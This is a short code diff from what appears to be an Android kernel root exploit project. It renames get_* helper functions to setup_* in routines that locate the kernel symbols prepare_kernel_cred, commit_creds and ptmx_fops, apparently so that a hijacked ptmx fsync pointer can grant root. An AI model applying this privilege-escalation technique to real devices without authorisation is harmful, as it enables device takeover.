@@ -38,7 +38,7 @@ run_obtain_root_privilege(void *user_data)
 static bool
 run_exploit(void)
 {
-  get_ptmx_fops_fsync_address();
+  setup_ptmx_fops_fsync_address();
   if (!ptmx_fops_fsync_address) {
     return false;
   }
@@ -80,7 +80,7 @@ find_ptmx_fops_address(void *mem, size_t length)
     return false;
   }
 
-  return get_ptmx_fops_address_in_memory(mem, length, &hint);
+  return setup_ptmx_fops_address_in_memory(mem, length, &hint);
 }
 
 bool find_variables_in_memory(void *mem, size_t length)
@@ -111,8 +111,8 @@ bool find_variables_in_memory(void *mem, size_t length)
     }
   }
 
-  get_prepare_kernel_cred_address_in_memory(mem, length);
-  get_commit_creds_address_in_memory(mem, length);
+  setup_prepare_kernel_cred_address_in_memory(mem, length);
+  setup_commit_creds_address_in_memory(mem, length);
 
   return prepare_kernel_cred && commit_creds && ptmx_fops;
 }
@@ -120,9 +120,9 @@ bool find_variables_in_memory(void *mem, size_t length)
 bool
 setup_variables(void)
 {
-  get_prepare_kernel_cred_address();
-  get_commit_creds_address();
-  get_ptmx_fops_address();
+  setup_prepare_kernel_cred_address();
+  setup_commit_creds_address();
+  setup_ptmx_fops_address();
 
   if (prepare_kernel_cred && commit_creds && ptmx_fops) {
     return true;
